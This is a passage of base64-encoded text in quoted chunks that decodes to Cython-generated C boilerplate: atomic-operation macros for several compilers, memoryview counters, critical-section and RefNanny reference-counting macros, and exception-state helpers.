01JQ1MpCiAgICAgICAgI3dhcm5pbmcgIlVzaW5nIHN0YW5kYXJkIEMgYXRvbWljcyIKICAgICNlbmRpZgojZWxpZiBDWVRIT05fQVRPTUlDUyAmJiAoZGVmaW5lZChfX2NwbHVzcGx1cykgJiYgKFwKICAgICAgICAgICAgICAgICAgICAoX19jcGx1c3BsdXMgPj0gMjAxMTAzTCkgfHxcClwKICAgICAgICAgICAgICAgICAgICAoZGVmaW5lZChfTVNDX1ZFUikgJiYgX01TQ19WRVIgPj0gMTcwMCkpICYmXAogICAgICAgICAgICAgICAgICAgIEFUT01JQ19JTlRfTE9DS19GUkVFID09IDIpCiAgICAjdW5kZWYgX19weXhfYXRvbWljX2ludF90eXBlCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19pbnRfdHlwZSBzdGQ6OmF0b21pY19pbnQKICAgICNkZWZpbmUgX19weXhfYXRvbWljX3B0cl90eXBlIHN0ZDo6YXRvbWljX3VpbnRwdHJfdAogICAgI2RlZmluZSBfX3B5eF9ub25hdG9taWNfcHRyX3R5cGUgdWludHB0cl90CiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19pbmNyX3JlbGF4ZWQodmFsdWUpIHN0ZDo6YXRvbWljX2ZldGNoX2FkZF9leHBsaWNpdCh2YWx1ZSwgMSwgc3RkOjptZW1vcnlfb3JkZXJfcmVsYXhlZCkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX2luY3JfYWNxX3JlbCh2YWx1ZSkgc3RkOjphdG9taWNfZmV0Y2hfYWRkX2V4cGxpY2l0KHZhbHVlLCAxLCBzdGQ6Om1lbW9yeV9vcmRlcl9hY3FfcmVsKQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfZGVjcl9hY3FfcmVsKHZhbHVlKSBzdGQ6OmF0b21pY19mZXRjaF9zdWJfZXhwbGljaXQodmFsdWUsIDEsIHN0ZDo6bWVtb3J5X29yZGVyX2FjcV9yZWwpCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19zdWIodmFsdWUsIGFyZykgc3RkOjphdG9taWNfZmV0Y2hfc3ViKHZhbHVlLCBhcmcpCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19pbnRfY21wX2V4Y2hhbmdlKHZhbHVlLCBleHBlY3RlZCwgZGVzaXJlZCkgc3RkOjphdG9taWNfY29tcGFyZV9leGNoYW5nZV9zdHJvbmcodmFsdWUsIGV4cGVjdGVkLCBkZXNpcmVkKQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfbG9hZCh2YWx1ZSkgc3RkOjphdG9taWNfbG9hZCh2YWx1ZSkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX3N0b3JlKHZhbHVlLCBuZXdfdmFsdWUpIHN0ZDo6YXRvbWljX3N0b3JlKHZhbHVlLCBu""ZXdfdmFsdWUpCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19wb2ludGVyX2xvYWRfcmVsYXhlZCh2YWx1ZSkgc3RkOjphdG9taWNfbG9hZF9leHBsaWNpdCh2YWx1ZSwgc3RkOjptZW1vcnlfb3JkZXJfcmVsYXhlZCkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX3BvaW50ZXJfbG9hZF9hY3F1aXJlKHZhbHVlKSBzdGQ6OmF0b21pY19sb2FkX2V4cGxpY2l0KHZhbHVlLCBzdGQ6Om1lbW9yeV9vcmRlcl9hY3F1aXJlKQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfcG9pbnRlcl9leGNoYW5nZSh2YWx1ZSwgbmV3X3ZhbHVlKSBzdGQ6OmF0b21pY19leGNoYW5nZSh2YWx1ZSwgKF9fcHl4X25vbmF0b21pY19wdHJfdHlwZSluZXdfdmFsdWUpCiAgICAjaWYgZGVmaW5lZChfX1BZWF9ERUJVR19BVE9NSUNTKSAmJiBkZWZpbmVkKF9NU0NfVkVSKQogICAgICAgICNwcmFnbWEgbWVzc2FnZSAoIlVzaW5nIHN0YW5kYXJkIEMrKyBhdG9taWNzIikKICAgICNlbGlmIGRlZmluZWQoX19QWVhfREVCVUdfQVRPTUlDUykKICAgICAgICAjd2FybmluZyAiVXNpbmcgc3RhbmRhcmQgQysrIGF0b21pY3MiCiAgICAjZW5kaWYKI2VsaWYgQ1lUSE9OX0FUT01JQ1MgJiYgKF9fR05VQ19fID49IDUgfHwgKF9fR05VQ19fID09IDQgJiZcCiAgICAgICAgICAgICAgICAgICAgKF9fR05VQ19NSU5PUl9fID4gMSB8fFwKICAgICAgICAgICAgICAgICAgICAoX19HTlVDX01JTk9SX18gPT0gMSAmJiBfX0dOVUNfUEFUQ0hMRVZFTF9fID49IDIpKSkpCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19wdHJfdHlwZSB2b2lkKgogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfaW5jcl9yZWxheGVkKHZhbHVlKSBfX3N5bmNfZmV0Y2hfYW5kX2FkZCh2YWx1ZSwgMSkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX2luY3JfYWNxX3JlbCh2YWx1ZSkgX19zeW5jX2ZldGNoX2FuZF9hZGQodmFsdWUsIDEpCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19kZWNyX2FjcV9yZWwodmFsdWUpIF9fc3luY19mZXRjaF9hbmRfc3ViKHZhbHVlLCAxKQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfc3ViKHZhbHVlLCBhcmcpIF9fc3luY19mZXRjaF9hbmRfc3ViKHZhbHVlLCBhcmcpCiAgICBzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19weXhfYXRvbWljX2ludF9jbXBfZXhjaGFuZ2UoX19weXhfYXRvbWljX2ludF90eXBlKiB2YWx1ZSwgX19weXhfbm9uYXRvbWljX2ludF90eXBlKiBleHBlY3RlZCwgX19weXhfbm9uYXRvbWljX2ludF90eXBlIGRlc2lyZWQpIHsKICAgICAgICBfX3B5eF9ub25hdG9taWNfaW50X3R5cGUgb2xkID0gX19zeW5jX3ZhbF9jb21wYXJlX2FuZF9zd2FwKHZhbHVlLCAqZXhwZWN0ZWQsIGRlc2lyZWQpOwogICAgICAgIGludCByZXN1bHQgPSBvbGQgPT0gKmV4cGVjdGVkOwogICAgICAgICpleHBlY3RlZCA9IG9sZDsKICAgICAgICByZXR1cm4gcmVzdWx0OwogICAgfQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfbG9hZCh2YWx1ZSkgX19zeW5jX2ZldGNoX2FuZF9hZGQodmFs""dWUsIDApCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19zdG9yZSh2YWx1ZSwgbmV3X3ZhbHVlKSBfX3N5bmNfbG9ja190ZXN0X2FuZF9zZXQodmFsdWUsIG5ld192YWx1ZSkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX3BvaW50ZXJfbG9hZF9yZWxheGVkKHZhbHVlKSBfX3N5bmNfZmV0Y2hfYW5kX2FkZCh2YWx1ZSwgMCkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX3BvaW50ZXJfbG9hZF9hY3F1aXJlKHZhbHVlKSBfX3N5bmNfZmV0Y2hfYW5kX2FkZCh2YWx1ZSwgMCkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX3BvaW50ZXJfZXhjaGFuZ2UodmFsdWUsIG5ld192YWx1ZSkgX19zeW5jX2xvY2tfdGVzdF9hbmRfc2V0KHZhbHVlLCAoX19weXhfYXRvbWljX3B0cl90eXBlKW5ld192YWx1ZSkKICAgICNpZmRlZiBfX1BZWF9ERUJVR19BVE9NSUNTCiAgICAgICAgI3dhcm5pbmcgIlVzaW5nIEdOVSBhdG9taWNzIgogICAgI2VuZGlmCiNlbGlmIENZVEhPTl9BVE9NSUNTICYmIGRlZmluZWQoX01TQ19WRVIpCiAgICAjaW5jbHVkZSA8aW50cmluLmg+CiAgICAjdW5kZWYgX19weXhfYXRvbWljX2ludF90eXBlCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19pbnRfdHlwZSBsb25nCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19wdHJfdHlwZSB2b2lkKgogICAgI3VuZGVmIF9fcHl4X25vbmF0b21pY19pbnRfdHlwZQogICAgI2RlZmluZSBfX3B5eF9ub25hdG9taWNfaW50X3R5cGUgbG9uZwogICAgI3ByYWdtYSBpbnRyaW5zaWMgKF9JbnRlcmxvY2tlZEV4Y2hhbmdlQWRkLCBfSW50ZXJsb2NrZWRFeGNoYW5nZSwgX0ludGVybG9ja2VkQ29tcGFyZUV4Y2hhbmdlLCBfSW50ZXJsb2NrZWRDb21wYXJlRXhjaGFuZ2VQb2ludGVyLCBfSW50ZXJsb2NrZWRFeGNoYW5nZVBvaW50ZXIpCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19pbmNyX3JlbGF4ZWQodmFsdWUpIF9JbnRlcmxvY2tlZEV4Y2hhbmdlQWRkKHZhbHVlLCAxKQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfaW5jcl9hY3FfcmVsKHZhbHVlKSBfSW50ZXJsb2NrZWRFeGNoYW5nZUFkZCh2YWx1ZSwgMSkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX2RlY3JfYWNxX3JlbCh2YWx1ZSkgX0ludGVybG9ja2VkRXhjaGFuZ2VBZGQodmFsdWUsIC0xKQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfc3ViKHZhbHVlLCBhcmcpIF9JbnRlcmxvY2tlZEV4Y2hhbmdlQWRkKHZhbHVlLCAtYXJnKQogICAgc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fcHl4X2F0b21pY19pbnRfY21wX2V4Y2hhbmdlKF9fcHl4X2F0b21pY19pbnRfdHlwZSogdmFsdWUsIF9fcHl4X25vbmF0b21pY19pbnRfdHlwZSogZXhwZWN0ZWQsIF9fcHl4X25vbmF0b21pY19pbnRfdHlwZSBkZXNpcmVkKSB7CiAgICAgICAgX19weXhfbm9uYXRvbWljX2ludF90eXBlIG9sZCA9IF9JbnRlcmxvY2tlZENvbXBhcmVFeGNoYW5nZSh2YWx1ZSwgZGVzaXJlZCwgKmV4cGVjdGVkKTsKICAgICAgICBpbnQgcmVzdWx0ID0gb2xkID09ICpleHBlY3Rl""ZDsKICAgICAgICAqZXhwZWN0ZWQgPSBvbGQ7CiAgICAgICAgcmV0dXJuIHJlc3VsdDsKICAgIH0KICAgICNkZWZpbmUgX19weXhfYXRvbWljX2xvYWQodmFsdWUpIF9JbnRlcmxvY2tlZEV4Y2hhbmdlQWRkKHZhbHVlLCAwKQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfc3RvcmUodmFsdWUsIG5ld192YWx1ZSkgX0ludGVybG9ja2VkRXhjaGFuZ2UodmFsdWUsIG5ld192YWx1ZSkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX3BvaW50ZXJfbG9hZF9yZWxheGVkKHZhbHVlKSAqKHZvaWQgKiB2b2xhdGlsZSAqKXZhbHVlCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19wb2ludGVyX2xvYWRfYWNxdWlyZSh2YWx1ZSkgX0ludGVybG9ja2VkQ29tcGFyZUV4Y2hhbmdlUG9pbnRlcih2YWx1ZSwgMCwgMCkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX3BvaW50ZXJfZXhjaGFuZ2UodmFsdWUsIG5ld192YWx1ZSkgX0ludGVybG9ja2VkRXhjaGFuZ2VQb2ludGVyKHZhbHVlLCAoX19weXhfYXRvbWljX3B0cl90eXBlKW5ld192YWx1ZSkKICAgICNpZmRlZiBfX1BZWF9ERUJVR19BVE9NSUNTCiAgICAgICAgI3ByYWdtYSBtZXNzYWdlICgiVXNpbmcgTVNWQyBhdG9taWNzIikKICAgICNlbmRpZgojZWxzZQogICAgI3VuZGVmIENZVEhPTl9BVE9NSUNTCiAgICAjZGVmaW5lIENZVEhPTl9BVE9NSUNTIDAKICAgICNpZmRlZiBfX1BZWF9ERUJVR19BVE9NSUNTCiAgICAgICAgI3dhcm5pbmcgIk5vdCB1c2luZyBhdG9taWNzIgogICAgI2VuZGlmCiNlbmRpZgojaWYgQ1lUSE9OX0FUT01JQ1MKICAgICNkZWZpbmUgX19weXhfYWRkX2FjcXVpc2l0aW9uX2NvdW50KG1lbXZpZXcpXAogICAgICAgICAgICAgX19weXhfYXRvbWljX2luY3JfcmVsYXhlZChfX3B5eF9nZXRfc2xpY2VfY291bnRfcG9pbnRlcihtZW12aWV3KSkKICAgICNkZWZpbmUgX19weXhfc3ViX2FjcXVpc2l0aW9uX2NvdW50KG1lbXZpZXcpXAogICAgICAgICAgICBfX3B5eF9hdG9taWNfZGVjcl9hY3FfcmVsKF9fcHl4X2dldF9zbGljZV9jb3VudF9wb2ludGVyKG1lbXZpZXcpKQojZWxzZQogICAgI2RlZmluZSBfX3B5eF9hZGRfYWNxdWlzaXRpb25fY291bnQobWVtdmlldylcCiAgICAgICAgICAgIF9fcHl4X2FkZF9hY3F1aXNpdGlvbl9jb3VudF9sb2NrZWQoX19weXhfZ2V0X3NsaWNlX2NvdW50X3BvaW50ZXIobWVtdmlldyksIG1lbXZpZXctPmxvY2spCiAgICAjZGVmaW5lIF9fcHl4X3N1Yl9hY3F1aXNpdGlvbl9jb3VudChtZW12aWV3KVwKICAgICAgICAgICAgX19weXhfc3ViX2FjcXVpc2l0aW9uX2NvdW50X2xvY2tlZChfX3B5eF9nZXRfc2xpY2VfY291bnRfcG9pbnRlcihtZW12aWV3KSwgbWVtdmlldy0+bG9jaykKI2VuZGlmCgoKI2luY2x1ZGUgPHN0cnVjdG1lbWJlci5oPgoKCiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkcKI2RlZmluZSBfX1B5eF9QeUNyaXRpY2FsU2VjdGlvbiB2b2lkKgojZGVmaW5lIF9fUHl4X1B5Q3JpdGljYWxTZWN0aW9u""MiB2b2lkKgojZGVmaW5lIF9fUHl4X1B5Q3JpdGljYWxTZWN0aW9uX0JlZ2luMShjcywgYXJnKSAodm9pZCljcwojZGVmaW5lIF9fUHl4X1B5Q3JpdGljYWxTZWN0aW9uX0JlZ2luMihjcywgYXJnMSwgYXJnMikgKHZvaWQpY3MKI2RlZmluZSBfX1B5eF9QeUNyaXRpY2FsU2VjdGlvbl9FbmQxKGNzKQojZGVmaW5lIF9fUHl4X1B5Q3JpdGljYWxTZWN0aW9uX0VuZDIoY3MpCiNlbHNlCiNkZWZpbmUgX19QeXhfUHlDcml0aWNhbFNlY3Rpb24gUHlDcml0aWNhbFNlY3Rpb24KI2RlZmluZSBfX1B5eF9QeUNyaXRpY2FsU2VjdGlvbjIgUHlDcml0aWNhbFNlY3Rpb24yCiNkZWZpbmUgX19QeXhfUHlDcml0aWNhbFNlY3Rpb25fQmVnaW4xIFB5Q3JpdGljYWxTZWN0aW9uX0JlZ2luCiNkZWZpbmUgX19QeXhfUHlDcml0aWNhbFNlY3Rpb25fQmVnaW4yIFB5Q3JpdGljYWxTZWN0aW9uMl9CZWdpbgojZGVmaW5lIF9fUHl4X1B5Q3JpdGljYWxTZWN0aW9uX0VuZDEgUHlDcml0aWNhbFNlY3Rpb25fRW5kCiNkZWZpbmUgX19QeXhfUHlDcml0aWNhbFNlY3Rpb25fRW5kMiBQeUNyaXRpY2FsU2VjdGlvbjJfRW5kCiNlbmRpZgojaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMGQwMDAwIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKI2RlZmluZSBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG8pIHsKI2RlZmluZSBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpIH0KI2Vsc2UKI2RlZmluZSBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OIFB5X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04KI2RlZmluZSBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTiBQeV9FTkRfQ1JJVElDQUxfU0VDVElPTgojZW5kaWYKCgoKCgoKc3RydWN0IF9fcHl4X29ial8yZ2FfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByOwoKCnN0cnVjdCBfX3B5eF9vYmpfMmdhX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciB7CiAgUHlPYmplY3RfSEVBRAogIFB5T2JqZWN0ICpfX3B5eF9nZW5leHByX2FyZ18wOwogIFB5T2JqZWN0ICpfX3B5eF92X0E7Cn07CgoKCgoKI2lmbmRlZiBDWVRIT05fUkVGTkFOTlkKICAjZGVmaW5lIENZVEhPTl9SRUZOQU5OWSAwCiNlbmRpZgojaWYgQ1lUSE9OX1JFRk5BTk5ZCiAgdHlwZWRlZiBzdHJ1Y3QgewogICAgdm9pZCAoKklOQ1JFRikodm9pZCosIFB5T2JqZWN0KiwgUHlfc3NpemVfdCk7CiAgICB2b2lkICgqREVDUkVGKSh2b2lkKiwgUHlPYmplY3QqLCBQeV9zc2l6ZV90KTsKICAgIHZvaWQgKCpHT1RSRUYpKHZvaWQqLCBQeU9iamVjdCosIFB5X3NzaXplX3QpOwogICAgdm9pZCAoKkdJVkVSRUYpKHZvaWQqLCBQeU9iamVjdCosIFB5X3NzaXplX3QpOwogICAgdm9pZCogKCpTZXR1cENvbnRleHQpKGNvbnN0IGNoYXIqLCBQeV9zc2l6ZV90LCBjb25zdCBjaGFyKik7CiAgICB2b2lkICgqRmluaXNoQ29udGV4dCkodm9pZCoqKTsKICB9IF9fUHl4X1JlZk5hbm55QVBJU3RydWN0OwogIHN0YXRpYyBfX1B5eF9SZWZOYW5ueUFQSVN0""cnVjdCAqX19QeXhfUmVmTmFubnkgPSBOVUxMOwogIHN0YXRpYyBfX1B5eF9SZWZOYW5ueUFQSVN0cnVjdCAqX19QeXhfUmVmTmFubnlJbXBvcnRBUEkoY29uc3QgY2hhciAqbW9kbmFtZSk7CiAgI2RlZmluZSBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucyB2b2lkICpfX3B5eF9yZWZuYW5ueSA9IE5VTEw7CiAgI2RlZmluZSBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dChuYW1lLCBhY3F1aXJlX2dpbClcCiAgICAgICAgICBpZiAoYWNxdWlyZV9naWwpIHtcCiAgICAgICAgICAgICAgUHlHSUxTdGF0ZV9TVEFURSBfX3B5eF9naWxzdGF0ZV9zYXZlID0gUHlHSUxTdGF0ZV9FbnN1cmUoKTtcCiAgICAgICAgICAgICAgX19weXhfcmVmbmFubnkgPSBfX1B5eF9SZWZOYW5ueS0+U2V0dXBDb250ZXh0KChuYW1lKSwgKF9fTElORV9fKSwgKF9fRklMRV9fKSk7XAogICAgICAgICAgICAgIFB5R0lMU3RhdGVfUmVsZWFzZShfX3B5eF9naWxzdGF0ZV9zYXZlKTtcCiAgICAgICAgICB9IGVsc2Uge1wKICAgICAgICAgICAgICBfX3B5eF9yZWZuYW5ueSA9IF9fUHl4X1JlZk5hbm55LT5TZXR1cENvbnRleHQoKG5hbWUpLCAoX19MSU5FX18pLCAoX19GSUxFX18pKTtcCiAgICAgICAgICB9CiAgI2RlZmluZSBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHROb2dpbCgpIHtcCiAgICAgICAgICAgICAgUHlHSUxTdGF0ZV9TVEFURSBfX3B5eF9naWxzdGF0ZV9zYXZlID0gUHlHSUxTdGF0ZV9FbnN1cmUoKTtcCiAgICAgICAgICAgICAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XAogICAgICAgICAgICAgIFB5R0lMU3RhdGVfUmVsZWFzZShfX3B5eF9naWxzdGF0ZV9zYXZlKTtcCiAgICAgICAgICB9CiAgI2RlZmluZSBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHROb2dpbCgpIHtcCiAgICAgICAgICAgICAgUHlHSUxTdGF0ZV9TVEFURSBfX3B5eF9naWxzdGF0ZV9zYXZlID0gUHlHSUxTdGF0ZV9FbnN1cmUoKTtcCiAgICAgICAgICAgICAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XAogICAgICAgICAgICAgIFB5R0lMU3RhdGVfUmVsZWFzZShfX3B5eF9naWxzdGF0ZV9zYXZlKTtcCiAgICAgICAgICB9CiAgI2RlZmluZSBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKVwKICAgICAgICAgIF9fUHl4X1JlZk5hbm55LT5GaW5pc2hDb250ZXh0KCZfX3B5eF9yZWZuYW5ueSkKICAjZGVmaW5lIF9fUHl4X0lOQ1JFRihyKSAgX19QeXhfUmVmTmFubnktPklOQ1JFRihfX3B5eF9yZWZuYW5ueSwgKFB5T2JqZWN0ICopKHIpLCAoX19MSU5FX18pKQogICNkZWZpbmUgX19QeXhfREVDUkVGKHIpICBfX1B5eF9SZWZOYW5ueS0+REVDUkVGKF9fcHl4X3JlZm5hbm55LCAoUHlPYmplY3QgKikociksIChfX0xJTkVfXykpCiAgI2RlZmluZSBfX1B5eF9HT1RSRUYocikgIF9fUHl4X1JlZk5hbm55LT5HT1RSRUYoX19weXhfcmVmbmFubnksIChQeU9iamVjdCAqKShyKSwgKF9fTElORV9fKSkKICAjZGVmaW5lIF9fUHl4X0dJVkVSRUYocikgX19Q""eXhfUmVmTmFubnktPkdJVkVSRUYoX19weXhfcmVmbmFubnksIChQeU9iamVjdCAqKShyKSwgKF9fTElORV9fKSkKICAjZGVmaW5lIF9fUHl4X1hJTkNSRUYocikgIGRvIHsgaWYoKHIpID09IE5VTEwpOyBlbHNlIHtfX1B5eF9JTkNSRUYocik7IH19IHdoaWxlKDApCiAgI2RlZmluZSBfX1B5eF9YREVDUkVGKHIpICBkbyB7IGlmKChyKSA9PSBOVUxMKTsgZWxzZSB7X19QeXhfREVDUkVGKHIpOyB9fSB3aGlsZSgwKQogICNkZWZpbmUgX19QeXhfWEdPVFJFRihyKSAgZG8geyBpZigocikgPT0gTlVMTCk7IGVsc2Uge19fUHl4X0dPVFJFRihyKTsgfX0gd2hpbGUoMCkKICAjZGVmaW5lIF9fUHl4X1hHSVZFUkVGKHIpIGRvIHsgaWYoKHIpID09IE5VTEwpOyBlbHNlIHtfX1B5eF9HSVZFUkVGKHIpO319IHdoaWxlKDApCiNlbHNlCiAgI2RlZmluZSBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogICNkZWZpbmUgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQobmFtZSwgYWNxdWlyZV9naWwpCiAgI2RlZmluZSBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHROb2dpbCgpCiAgI2RlZmluZSBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKQogICNkZWZpbmUgX19QeXhfSU5DUkVGKHIpIFB5X0lOQ1JFRihyKQogICNkZWZpbmUgX19QeXhfREVDUkVGKHIpIFB5X0RFQ1JFRihyKQogICNkZWZpbmUgX19QeXhfR09UUkVGKHIpCiAgI2RlZmluZSBfX1B5eF9HSVZFUkVGKHIpCiAgI2RlZmluZSBfX1B5eF9YSU5DUkVGKHIpIFB5X1hJTkNSRUYocikKICAjZGVmaW5lIF9fUHl4X1hERUNSRUYocikgUHlfWERFQ1JFRihyKQogICNkZWZpbmUgX19QeXhfWEdPVFJFRihyKQogICNkZWZpbmUgX19QeXhfWEdJVkVSRUYocikKI2VuZGlmCiNkZWZpbmUgX19QeXhfUHlfWERFQ1JFRl9TRVQociwgdikgZG8ge1wKICAgICAgICBQeU9iamVjdCAqdG1wID0gKFB5T2JqZWN0ICopIHI7XAogICAgICAgIHIgPSB2OyBQeV9YREVDUkVGKHRtcCk7XAogICAgfSB3aGlsZSAoMCkKI2RlZmluZSBfX1B5eF9YREVDUkVGX1NFVChyLCB2KSBkbyB7XAogICAgICAgIFB5T2JqZWN0ICp0bXAgPSAoUHlPYmplY3QgKikgcjtcCiAgICAgICAgciA9IHY7IF9fUHl4X1hERUNSRUYodG1wKTtcCiAgICB9IHdoaWxlICgwKQojZGVmaW5lIF9fUHl4X0RFQ1JFRl9TRVQociwgdikgZG8ge1wKICAgICAgICBQeU9iamVjdCAqdG1wID0gKFB5T2JqZWN0ICopIHI7XAogICAgICAgIHIgPSB2OyBfX1B5eF9ERUNSRUYodG1wKTtcCiAgICB9IHdoaWxlICgwKQojZGVmaW5lIF9fUHl4X0NMRUFSKHIpICAgIGRvIHsgUHlPYmplY3QqIHRtcCA9ICgoUHlPYmplY3QqKShyKSk7IHIgPSBOVUxMOyBfX1B5eF9ERUNSRUYodG1wKTt9IHdoaWxlKDApCiNkZWZpbmUgX19QeXhfWENMRUFSKHIpICAgZG8geyBpZigocikgIT0gTlVMTCkge1B5T2JqZWN0KiB0bXAgPSAoKFB5T2JqZWN0KikocikpOyByID0gTlVMTDsgX19QeXhfREVDUkVGKHRtcCk7fX0gd2hpbGUoMCkKCgojaWYgQ1lUSE9OX0ZBU1Rf""VEhSRUFEX1NUQVRFCiNkZWZpbmUgX19QeXhfUHlFcnJfRXhjZXB0aW9uTWF0Y2hlcyhlcnIpIF9fUHl4X1B5RXJyX0V4Y2VwdGlvbk1hdGNoZXNJblN0YXRlKF9fcHl4X3RzdGF0ZSwgZXJyKQpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlFcnJfRXhjZXB0aW9uTWF0Y2hlc0luU3RhdGUoUHlUaHJlYWRTdGF0ZSogdHN0YXRlLCBQeU9iamVjdCogZXJyKTsKI2Vsc2UKI2RlZmluZSBfX1B5eF9QeUVycl9FeGNlcHRpb25NYXRjaGVzKGVycikgIFB5RXJyX0V4Y2VwdGlvbk1hdGNoZXMoZXJyKQojZW5kaWYKCgojaWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFCiNkZWZpbmUgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlICBQeVRocmVhZFN0YXRlICpfX3B5eF90c3RhdGU7CiNkZWZpbmUgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ24gIF9fcHl4X3RzdGF0ZSA9IF9fUHl4X1B5VGhyZWFkU3RhdGVfQ3VycmVudDsKI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwQTYKI2RlZmluZSBfX1B5eF9QeUVycl9PY2N1cnJlZCgpICAoX19weXhfdHN0YXRlLT5jdXJyZW50X2V4Y2VwdGlvbiAhPSBOVUxMKQojZGVmaW5lIF9fUHl4X1B5RXJyX0N1cnJlbnRFeGNlcHRpb25UeXBlKCkgIChfX3B5eF90c3RhdGUtPmN1cnJlbnRfZXhjZXB0aW9uID8gKFB5T2JqZWN0KikgUHlfVFlQRShfX3B5eF90c3RhdGUtPmN1cnJlbnRfZXhjZXB0aW9uKSA6IChQeU9iamVjdCopIE5VTEwpCiNlbHNlCiNkZWZpbmUgX19QeXhfUHlFcnJfT2NjdXJyZWQoKSAgKF9fcHl4X3RzdGF0ZS0+Y3VyZXhjX3R5cGUgIT0gTlVMTCkKI2RlZmluZSBfX1B5eF9QeUVycl9DdXJyZW50RXhjZXB0aW9uVHlwZSgpICAoX19weXhfdHN0YXRlLT5jdXJleGNfdHlwZSkKI2VuZGlmCiNlbHNlCiNkZWZpbmUgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlCiNkZWZpbmUgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ24KI2RlZmluZSBfX1B5eF9QeUVycl9PY2N1cnJlZCgpICAoUHlFcnJfT2NjdXJyZWQoKSAhPSBOVUxMKQojZGVmaW5lIF9fUHl4X1B5RXJyX0N1cnJlbnRFeGNlcHRpb25UeXBlKCkgIFB5RXJyX09jY3VycmVkKCkKI2VuZGlmCgoKI2lmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURQojZGVmaW5lIF9fUHl4X1B5RXJyX0NsZWFyKCkgX19QeXhfRXJyUmVzdG9yZShOVUxMLCBOVUxMLCBOVUxMKQojZGVmaW5lIF9fUHl4X0VyclJlc3RvcmVXaXRoU3RhdGUodHlwZSwgdmFsdWUsIHRiKSAgX19QeXhfRXJyUmVzdG9yZUluU3RhdGUoUHlUaHJlYWRTdGF0ZV9HRVQoKSwgdHlwZSwgdmFsdWUsIHRiKQojZGVmaW5lIF9fUHl4X0VyckZldGNoV2l0aFN0YXRlKHR5cGUsIHZhbHVlLCB0YikgICAgX19QeXhfRXJyRmV0Y2hJblN0YXRlKFB5VGhyZWFkU3RhdGVfR0VUKCksIHR5cGUsIHZhbHVlLCB0YikKI2RlZmluZSBfX1B5eF9FcnJSZXN0b3JlKHR5cGUsIHZhbHVlLCB0YikgIF9fUHl4X0VyclJlc3RvcmVJblN0YXRlKF9fcHl4X3RzdGF0ZSwgdHlwZSwgdmFsdWUs""IHRiKQojZGVmaW5lIF9fUHl4X0VyckZldGNoKHR5cGUsIHZhbHVlLCB0YikgICAgX19QeXhfRXJyRmV0Y2hJblN0YXRlKF9fcHl4X3RzdGF0ZSwgdHlwZSwgdmFsdWUsIHRiKQpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0VyclJlc3RvcmVJblN0YXRlKFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSwgUHlPYmplY3QgKnR5cGUsIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKnRiKTsKc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9FcnJGZXRjaEluU3RhdGUoUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBQeU9iamVjdCAqKnR5cGUsIFB5T2JqZWN0ICoqd